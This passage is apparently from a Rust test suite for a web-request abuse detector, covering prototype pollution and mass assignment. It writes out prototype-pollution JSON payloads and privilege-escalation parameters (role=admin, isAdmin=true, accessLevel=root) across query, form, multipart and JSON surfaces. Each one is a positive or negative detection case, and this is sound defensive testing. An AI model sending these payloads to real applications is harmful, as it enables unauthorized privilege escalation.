                    signals.iter().any(|s| s.tag == "proto_pollution"),
                    "expected proto_pollution for: {}",
                    $body,
                );
            }
        };
    }
    proto_pollution!(pp_proto_simple,       r#"{"__proto__":{"polluted":"x"}}"#);
    proto_pollution!(pp_proto_exec,         r#"{"__proto__":{"exec":"id"}}"#);
    proto_pollution!(pp_proto_nested,       r#"{"data":{"__proto__":{"x":1}}}"#);
    proto_pollution!(pp_proto_with_ws,      r#"{ "__proto__" : {"a":1} }"#);
    proto_pollution!(pp_proto_array_member, r#"[{"__proto__":{"k":"v"}}]"#);
    proto_pollution!(pp_constructor_proto,
        r#"{"constructor":{"prototype":{"polluted":"x"}}}"#);
    proto_pollution!(pp_constructor_proto_nested,
        r#"{"x":{"constructor":{"prototype":{"isAdmin":true}}}}"#);

    // ---- Negative: should NOT trip proto_pollution ----
    macro_rules! pp_clean {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
                    !signals.iter().any(|s| s.tag == "proto_pollution"),
                    "false positive proto_pollution for: {}",
                    $body,
                );
            }
        };
    }
    pp_clean!(pp_clean_single_underscore, r#"{"_proto_":"x"}"#);
    pp_clean!(pp_clean_proto_substring,   r#"{"item":"__proto__-string"}"#);
    pp_clean!(pp_clean_constructor_only,  r#"{"constructor":"NamedClass"}"#);
    pp_clean!(pp_clean_prototype_only,    r#"{"prototype":"someValue"}"#);
    pp_clean!(pp_clean_proto_word,        r#"{"description":"this is a prototype design"}"#);
    pp_clean!(pp_clean_normal_obj,        r#"{"name":"alice","email":"a@b.com"}"#);

    // ---------- S2 (2026-05-18) mass-assignment scope widen ----------
    //
    // Covers the four surfaces beyond the JSON-only path that the
    // ML rules-binary eval surfaced (`Manipulation` 59 % recall):
    //   - Query string (`?role=admin`)
    //   - Form-encoded body (`role=admin`)
    //   - Multipart name= (`Content-Disposition: form-data; name="role"`)
    //   - Widened JSON key set (camelCase + snake_case synonyms)

    fn build_view(
        method: http::Method,
        uri: &str,
        content_type: Option<&str>,
        body: &[u8],
    ) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        let mut headers = http::HeaderMap::new();
        if let Some(ct) = content_type {
            headers.insert(http::header::CONTENT_TYPE, ct.parse().unwrap());
        }
        (
            method,
            uri.parse().unwrap(),
            headers,
            BodyPeek::new(body.to_vec(), Some(body.len() as u64), false),
        )
    }

    fn assert_mass_assign(signals: &[Signal], field: &str) {
        assert!(
            signals
                .iter()
                .any(|s| s.tag == "mass_assignment" && s.field == field),
            "expected mass_assignment signal with field={field}, got {:?}",
            signals
                .iter()
                .map(|s| format!("{}/{}", s.tag, s.field))
                .collect::<Vec<_>>(),
        );
    }

    // ---- Query-string surface ----

    #[test]
    fn s2_query_role_admin_flagged() {
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = build_view(http::Method::GET, "/profile?role=admin", None, b"");
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "query");
    }

    #[test]
    fn s2_query_is_admin_flagged() {
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) =
            build_view(http::Method::GET, "/signup?isAdmin=true", None, b"");
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "query");
    }

    #[test]
    fn s2_query_privilege_escalation_synonym_flagged() {
        // `accessLevel` is an unambiguous privilege-escalation key —
        // stays in the query key set after the S1 split.
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = build_view(
            http::Method::GET,
            "/profile?accessLevel=root",
            None,
            b"",
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "query");
    }

    #[test]
    fn s2_query_after_legit_param_flagged() {
        // Boundary anchor matches `&role=` after a legit param.
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = build_view(
            http::Method::GET,
            "/profile?name=alice&role=admin",
            None,
            b"",
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "query");
    }

    #[test]
    fn s2_query_url_encoded_key_flagged() {
        // `%72ole` decodes to `role` — the form regex matches the
        // url_decode pass.
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) =
            build_view(http::Method::GET, "/?%72ole=admin", None, b"");
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "query");
    }

    #[test]
    fn s2_query_substring_key_not_flagged() {
        // `dropdown_role=options` contains the literal `role=` but
        // not at a `^` / `&` boundary — must NOT fire.
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = build_view(
            http::Method::GET,
            "/items?dropdown_role=options",
            None,
            b"",
        );
        let req = view(&m, &u, &h, &b);
        assert!(
            !d.inspect(&req)
                .iter()
                .any(|s| s.tag == "mass_assignment"),
            "false-positive on substring of `role` boundary"
        );
    }

    #[test]
    fn s2_query_clean_legit_filter_not_flagged() {
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = build_view(
            http::Method::GET,
            "/items?category=books&sort=name&page=2",
            None,
            b"",
        );
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    // ---- S1 (2026-06-18) query key-set split ----
    //
    // §2c FP fix: credential/token/scope/financial/verified keys are
    // ubiquitous *benign* query params (OAuth-token-in-URL, mapbox
    // `access_token=pk…`). Privilege escalation via query string is an
    // authz/gateway concern — the query scan must restrict to the
    // unambiguous privilege-escalation keys only. The body surfaces
    // keep the full 27-key set.

    /// Query keys that MUST still fire (privilege escalation).
    macro_rules! s1_query_blocks {
        ($name:ident, $uri:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let (m, u, h, b) = build_view(http::Method::GET, $uri, None, b"");
                let req = view(&m, &u, &h, &b);
                assert_mass_assign(&d.inspect(&req), "query");
            }
        };
    }
    s1_query_blocks!(s1_query_role_admin,     "/p?role=admin");
    s1_query_blocks!(s1_query_is_admin,       "/p?is_admin=true");
    s1_query_blocks!(s1_query_isadmin_camel,  "/p?isAdmin=true");
    s1_query_blocks!(s1_query_superuser,      "/p?superuser=1");
    s1_query_blocks!(s1_query_privileges,     "/p?privileges=root");
    s1_query_blocks!(s1_query_grants,         "/p?grants=all");
    s1_query_blocks!(s1_query_access_level,   "/p?access_level=root");
    s1_query_blocks!(s1_query_access_level_c, "/p?accessLevel=root");

    /// Credential/token/scope/financial/verified keys that MUST NOT
    /// fire on the *query* surface (legit benign URL params).
    macro_rules! s1_query_clean {
        ($name:ident, $uri:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let (m, u, h, b) = build_view(http::Method::GET, $uri, None, b"");
                let req = view(&m, &u, &h, &b);
                assert!(
                    !d.inspect(&req).iter().any(|s| s.tag == "mass_assignment"),
                    "false-positive mass_assignment on benign query param: {}",
                    $uri,
                );
            }
        };
    }
    s1_query_clean!(s1_query_access_token,   "/tiles?access_token=pk.eyJ1Ijoiba");
    s1_query_clean!(s1_query_access_token_c, "/tiles?accessToken=pk.eyJ1Ijoiba");
    s1_query_clean!(s1_query_api_key,        "/v1/data?apiKey=AIzaSyAbCdEf");
    s1_query_clean!(s1_query_api_key_snake,  "/v1/data?api_key=AIzaSyAbCdEf");
    s1_query_clean!(s1_query_refresh_token,  "/oauth?refresh_token=def502");
    s1_query_clean!(s1_query_refresh_camel,  "/oauth?refreshToken=def502");
    s1_query_clean!(s1_query_scope,          "/oauth?scope=read+write");
    s1_query_clean!(s1_query_credit,         "/billing?credit=500");
    s1_query_clean!(s1_query_balance,        "/wallet?balance=1000");
    s1_query_clean!(s1_query_account_bal,    "/wallet?accountBalance=99999");
    s1_query_clean!(s1_query_verified,       "/profile?verified=true");
    s1_query_clean!(s1_query_email_verified, "/profile?email_verified=true");

    /// FP-2026-07-07 (MA-1): credential/token field NAMES no longer flag on
    /// the body/form surfaces (authz/gateway concern, ubiquitous benign
    /// echo). A privilege-COLLECTION field (`permissions`) in a write body IS
    /// still the real mass-assignment shape and stays flagged.
    #[test]
    fn s1_body_access_token_no_longer_flagged() {
        let d = BodyAbuseDetector::default();
        let body = br#"{"name":"alice","access_token":"stolen"}"#;
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(
            !d.inspect(&req).iter().any(|s| s.tag == "mass_assignment"),
            "access_token field name must not flag on the body surface",
        );
    }

    #[test]
    fn s1_body_permissions_still_flagged() {
        let d = BodyAbuseDetector::default();
        let body = br#"{"name":"alice","permissions":["*"]}"#;
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s1_form_body_api_key_no_longer_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"username=bob&api_key=sk_live_abcd";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/x-www-form-urlencoded"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(
            !d.inspect(&req).iter().any(|s| s.tag == "mass_assignment"),
            "api_key field name must not flag on the form-body surface",
        );
    }

    // ---- Form-encoded body surface ----

    #[test]
    fn s2_form_body_role_admin_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"name=alice&role=admin&email=a%40b.com";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/signup",
            Some("application/x-www-form-urlencoded"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_form_body_password_hash_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"username=bob&passwordHash=deadbeef";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/x-www-form-urlencoded"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_form_body_url_encoded_key_flagged() {
        let d = BodyAbuseDetector::default();
        // `%72ole=admin` — decoded form trips the regex.
        let body = b"name=alice&%72ole=admin";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/signup",
            Some("application/x-www-form-urlencoded"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_form_body_wrong_content_type_not_flagged() {
        // Body looks form-encoded but Content-Type says JSON — the
        // detector must respect the content-type sniff.
        let d = BodyAbuseDetector::default();
        let body = b"role=admin&user=bob";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/signup",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        // No JSON `{` prefix → JSON path skipped too. No signal.
        assert!(d.inspect(&req).is_empty());
    }

    #[test]
    fn s2_form_body_clean_not_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"firstname=Alice&lastname=Doe&newsletter=true";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/profile",
            Some("application/x-www-form-urlencoded"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    // ---- Multipart name= surface ----

    #[test]
    fn s2_multipart_name_role_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"--boundary\r\nContent-Disposition: form-data; name=\"role\"\r\n\r\nadmin\r\n--boundary--\r\n";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/upload",
            Some("multipart/form-data; boundary=boundary"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_multipart_name_is_admin_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"--bdry\r\nContent-Disposition: form-data; name=\"isAdmin\"\r\n\r\ntrue\r\n--bdry--\r\n";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("multipart/form-data; boundary=bdry"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_multipart_clean_file_upload_not_flagged() {
        let d = BodyAbuseDetector::default();
        let body = b"--b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.png\"\r\nContent-Type: image/png\r\n\r\n...binary...\r\n--b--\r\n";
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/upload",
            Some("multipart/form-data; boundary=b"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    // ---- Widened JSON key set ----

    #[test]
    fn s2_json_camelcase_is_superuser_flagged() {
        let d = BodyAbuseDetector::default();
        let body = br#"{"name":"alice","isSuperuser":true}"#;
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_json_access_level_flagged() {
        let d = BodyAbuseDetector::default();
        let body = br#"{"id":42,"accessLevel":"root"}"#;
        let (m, u, h, b) = build_view(
            http::Method::PATCH,
            "/api/users/42",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert_mass_assign(&d.inspect(&req), "body");
    }

    #[test]
    fn s2_json_apikey_camelcase_no_longer_flagged() {
        // FP-2026-07-07 (MA-1): `apiKey` (a credential field NAME) is a
        // ubiquitous benign write-body echo, not mass-assignment. Dropped
        // from the body NAME set.
        let d = BodyAbuseDetector::default();
        let body = br#"{"name":"alice","apiKey":"sk_live_abcd"}"#;
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/api/users",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(
            !d.inspect(&req).iter().any(|s| s.tag == "mass_assignment"),
            "apiKey field name must not flag on the body surface",
        );
    }

    #[test]
    fn s2_json_legit_role_string_value_not_flagged() {
        // S-C (2026-06-18 round-2) — the prior trade-off (match on key name
        // alone) flagged this legit job-title field. The body surfaces now
        // require an ESCALATING role value, so `"role":"engineer"` is
        // correctly benign. `"role":"admin"` still fires (see ma_role_admin).
        let d = BodyAbuseDetector::default();
        let body = br#"{"role":"engineer"}"#;
        let (m, u, h, b) = build_view(
            http::Method::POST,
            "/jobs",
            Some("application/json"),
            body,
        );
        let req = view(&m, &u, &h, &b);
        assert!(
            !d.inspect(&req).iter().any(|s| s.tag == "mass_assignment"),
            "legit role value must not trip mass-assignment",
        );
    }
}
